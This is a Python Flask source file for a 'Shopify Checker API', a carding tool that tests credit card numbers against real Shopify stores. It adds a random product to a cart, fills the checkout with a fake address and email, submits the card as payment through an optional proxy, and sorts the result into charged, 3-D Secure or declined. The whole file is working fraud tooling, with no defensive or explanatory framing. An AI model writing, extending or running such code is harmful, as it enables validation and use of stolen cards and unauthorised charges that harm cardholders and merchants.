from flask import Flask, request, jsonify
import requests
import random
import json
import re
import os
import time
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
}

TIMEOUT = 25

# ═══════════════════════════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════════════════════════
@app.route('/')
def home():
    return jsonify({
        "status": True,
        "message": "Shopify Checker API v1",
        "endpoints": ["/shopify", "/health", "/products"]
    })

@app.route('/health')
def health():
    return jsonify({"status": True, "message": "OK", "time": time.time()})

@app.route('/shopify')
def shopify_check():
    """Main CC check endpoint"""
    try:
        site = request.args.get('site', '').strip()
        cc = request.args.get('cc', '').strip()
        proxy = request.args.get('proxy', '').strip()

        # Validate
        if not site or not cc:
            return jsonify({
                "Status": False,
                "Response": "Missing params: site, cc",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        if '|' not in cc:
            return jsonify({
                "Status": False,
                "Response": "Invalid CC format",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        # Normalize site
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        if '.' not in site:
            return jsonify({
                "Status": False,
                "Response": "Invalid site URL",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        # Check card
        result = check_shopify(site, cc, proxy)
        return jsonify(result)

    except Exception as e:
        return jsonify({
            "Status": False,
            "Response": f"Error: {str(e)[:100]}",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        })


@app.route('/products')
def get_products():
    """Site ke products fetch karo"""
    try:
        site = request.args.get('site', '').strip()
        if not site:
            return jsonify({"status": False, "error": "Missing site"})

        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        products = fetch_products(site)

        return jsonify({
            "status": True,
            "site": site,
            "count": len(products),
            "products": products[:20]
        })
    except Exception as e:
        return jsonify({"status": False, "error": str(e)[:100]})


# ═══════════════════════════════════════════════════════════
# CORE LOGIC
# ═══════════════════════════════════════════════════════════
def get_session(proxy=None):
    """Session with headers"""
    s = requests.Session()
    s.headers.update(DEFAULT_HEADERS)
    s.verify = False
    if proxy and proxy not in ('test', 'no', ''):
        try:
            s.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        except:
            pass
    return s


def fetch_products(site):
    """Shopify site se products fetch karo"""
    products = []
    s = get_session()
    try:
        # Method 1: products.json endpoint
        r = s.get(f'https://{site}/products.json?limit=50', timeout=TIMEOUT)
        if r.status_code == 200:
            try:
                data = r.json()
                for p in data.get('products', []):
                    for v in p.get('variants', []):
                        products.append({
                            'title': p.get('title', ''),
                            'variant_id': v.get('id'),
                            'price': v.get('price'),
                            'available': v.get('available', False),
                            'requires_shipping': v.get('requires_shipping', True),
                        })
                if products:
                    return products
            except:
                pass

        # Method 2: Homepage se JSON-LD extract
        r = s.get(f'https://{site}', timeout=TIMEOUT)
        if r.status_code == 200:
            jsonld = re.findall(r'<script[^>]*type="application/ld\+json"[^>]*>(.*?)</script>', r.text, re.DOTALL)
            for j in jsonld:
                try:
                    data = json.loads(j)
                    if isinstance(data, dict) and data.get('@type') == 'Product':
                        products.append({
                            'title': data.get('name', ''),
                            'variant_id': None,
                            'price': data.get('offers', {}).get('price', '0'),
                            'available': True,
                        })
                except:
                    pass

    except Exception as e:
        print(f"fetch_products error: {e}")

    return products


def check_shopify(site, cc, proxy):
    """
    Main Shopify CC checking flow:
    1. Product nikalo
    2. Cart create karo
    3. Checkout token lo
    4. Address add karo
    5. Payment submit karo
    """
    try:
        parts = cc.split('|')
        if len(parts) != 4:
            return {
                "Status": False,
                "Response": "Invalid CC: " + cc[:20],
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            }

        card_num, month, year, cvv = parts
        # Normalize year
        if len(year) == 2:
            year = '20' + year
        month = month.zfill(2)

        s = get_session(proxy)

        # ═══════════════════════════════════════
        # STEP 1: Products fetch
        # ═══════════════════════════════════════
        products = fetch_products(site)
        if not products:
            return {
                "Status": False,
                "Response": "No products available",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            }

        # Random product select
        product = random.choice(products)
        variant_id = product.get('variant_id')
        price = product.get('price', '1.00')

        if not variant_id:
            return {
                "Status": False,
                "Response": "Variant ID missing",
                "Price": price,
                "Gateway": "Auto Shopify"
            }

        # ═══════════════════════════════════════
        # STEP 2: Cart create
        # ═══════════════════════════════════════
        cart_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': f'https://{site}',
            'Referer': f'https://{site}/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        s.headers.update(cart_headers)

        # Method A: /cart/add.js
        cart_data = {'id': variant_id, 'quantity': 1}
        r_cart = s.post(f'https://{site}/cart/add.js', json=cart_data, timeout=TIMEOUT)

        token = None

        if r_cart.status_code == 200:
            try:
                cart_resp = r_cart.json()
                # Cart token
                token = cart_resp.get('token')

                # Ya cart me checkout URL milega
                if not token:
                    # /cart.js se token nikalo
                    r_cartjs = s.get(f'https://{site}/cart.js', timeout=TIMEOUT)
                    if r_cartjs.status_code == 200:
                        cj = r_cartjs.json()
                        token = cj.get('token')
            except:
                pass

        # Method B: Direct checkout endpoint
        if not token:
            checkout_data = {
                "checkout": {
                    "line_items": [{"variant_id": variant_id, "quantity": 1}]
                }
            }
            r_co = s.post(
                f'https://{site}/wallets/checkouts.json',
                json=checkout_data,
                timeout=TIMEOUT
            )
            if r_co.status_code in (200, 201):
                try:
                    token = r_co.json().get('checkout', {}).get('token')
                except:
                    pass

        if not token:
            return {
                "Status": False,
                "Response": "Cart failed: " + str(r_cart.status_code),
                "Price": price,
                "Gateway": "Auto Shopify"
            }

        # ═══════════════════════════════════════
        # STEP 3: Address add
        # ═══════════════════════════════════════
        address = {
            "first_name": "John",
            "last_name": "Smith",
            "address1": "123 Main Street",
            "address2": "Apt 4B",
            "city": "New York",
            "province": "NY",
            "province_code": "NY",
            "country": "United States",
            "country_code": "US",
            "zip": "10001",
            "phone": "+1" + str(random.randint(2000000000, 9999999999)),
        }

        checkout_update = {
            "checkout": {
                "email": f"user{random.randint(10000, 99999)}@gmail.com",
                "shipping_address": address,
                "billing_address": address,
            }
        }

        s.put(
            f'https://{site}/wallets/checkouts/{token}.json',
            json=checkout_update,
            timeout=TIMEOUT
        )

        # Shipping line select karo
        try:
            shipping_data = {"checkout": {"shipping_line": {"handle": "standard"}}}
            s.put(
                f'https://{site}/wallets/checkouts/{token}.json',
                json=shipping_data,
                timeout=TIMEOUT
            )
        except:
            pass

        # ═══════════════════════════════════════
        # STEP 4: Payment submit
        # ═══════════════════════════════════════
        payment_data = {
            "payment": {
                "credit_card": {
                    "number": card_num,
                    "month": month,
                    "year": year,
                    "verification_value": cvv,
                    "first_name": address["first_name"],
                    "last_name": address["last_name"],
                },
                "amount": price,
                "currency": "USD",
            }
        }

        r_pay = s.post(
            f'https://{site}/checkouts/{token}/payment',
            json=payment_data,
            timeout=TIMEOUT
        )

        # ═══════════════════════════════════════
        # STEP 5: Response parse
        # ═══════════════════════════════════════
        raw_text = r_pay.text or ''
        raw_lower = raw_text.lower()

        # ---- DEAD DETECTION ----
        dead_keywords = [
            'card_declined', 'declined', 'insufficient_funds', 'do_not_honor',
            'expired_card', 'incorrect_cvv', 'incorrect_number', 'invalid_card',
            'stolen_card', 'lost_card', 'pickup_card', 'restricted_card',
            'generic_decline', 'fraudulent', 'not_permitted', 'card_velocity_exceeded',
            'payment_method_not_available', 'processing_error',
            'cvv_failure', 'transaction_not_allowed',
        ]

        # ---- CHARGED DETECTION ----
        charged_keywords = [
            'charged', 'order_completed', 'order_placed', 'order_paid',
            'payment_successful', 'thank_you', 'success',
        ]

        # ---- 3DS DETECTION ----
        threeds_keywords = [
            'requires_action', '3d_secure', '3ds', 'authentication_required',
            'challenge_required', '3dsecure',
        ]

        try:
            resp_json = r_pay.json()
            resp_str = json.dumps(resp_json)
            resp_lower = resp_str.lower()

            # Payment status check
            payment = resp_json.get('payment', {})
            if isinstance(payment, dict):
                status = str(payment.get('status', '')).lower()
                err_msg = payment.get('payment_processing_error_message', '') or ''
                err_msg = str(err_msg)

                # Charged
                if status in ('success', 'completed', 'authorized', 'captured', 'paid'):
                    return {
                        "Status": True,
                        "Response": f"Charged ${price} ✓",
                        "Price": price,
                        "Gateway": "Auto Shopify",
                        "Site": site,
                    }

                # 3DS
                if 'requires_action' in status or '3d' in err_msg.lower():
                    return {
                        "Status": False,
                        "Response": f"3DS Required: {err_msg[:80]}",
                        "Price": price,
                        "Gateway": "Auto Shopify",
                    }

                # Dead
                if err_msg:
                    return {
                        "Status": False,
                        "Response": err_msg[:120],
                        "Price": price,
                        "Gateway": "Auto Shopify",
                    }

            # Generic check
            if any(k in resp_lower for k in charged_keywords):
                return {
                    "Status": True,
                    "Response": f"Charged ${price} ✓",
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            if any(k in resp_lower for k in dead_keywords):
                return {
                    "Status": False,
                    "Response": resp_str[:120],
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            if any(k in resp_lower for k in threeds_keywords):
                return {
                    "Status": False,
                    "Response": "3DS Required",
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            # Unknown
            if resp_json.get('message'):
                return {
                    "Status": False,
                    "Response": str(resp_json.get('message'))[:120],
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

        except:
            # JSON parse fail — text check karo
            pass

        # Direct text check
        if any(k in raw_lower for k in charged_keywords):
            return {
                "Status": True,
                "Response": f"Charged ${price} ✓",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if any(k in raw_lower for k in dead_keywords):
            return {
                "Status": False,
                "Response": raw_text[:120],
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if r_pay.status_code == 402:
            return {
                "Status": False,
                "Response": "Card Declined (402)",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if r_pay.status_code == 200:
            return {
                "Status": True,
                "Response": f"Charged ${price} ✓",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        return {
            "Status": False,
            "Response": f"Unknown: HTTP {r_pay.status_code} | {raw_text[:80]}",
            "Price": price,
            "Gateway": "Auto Shopify",
        }

    except requests.Timeout:
        return {
            "Status": False,
            "Response": "Timeout",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }
    except requests.ConnectionError:
        return {
            "Status": False,
            "Response": "Connection error",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }
    except Exception as e:
        return {
            "Status": False,
            "Response": f"Error: {str(e)[:100]}",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }


# ═══════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)